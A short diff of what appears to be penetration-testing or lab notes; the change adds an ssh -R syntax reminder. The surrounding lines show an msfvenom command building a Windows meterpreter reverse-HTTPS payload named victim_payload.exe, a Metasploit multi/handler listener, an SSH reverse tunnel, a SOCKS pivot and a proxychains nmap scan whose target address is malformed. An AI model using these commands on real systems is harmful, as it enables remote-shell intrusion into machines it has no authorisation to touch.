@@ -117,6 +117,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https \
    -f exe -o victim_payload.exe
 
 ssh -R 172.16.0.20:8443:127.0.0.1:4443 root@192.168.0.200 -N -f
+-R [REMOTE_IP:REMOTE_PORT]:[LOCAL_IP:LOCAL_PORT]
 
 msfconsole -q -x "
 use exploit/multi/handler;
@@ -134,6 +135,7 @@ msf6 exploit(multi/handler) > run socks5 -p 9050
 
 proxychains nmap -sT 172.160.20 -p-
 ```
+
 
 
 
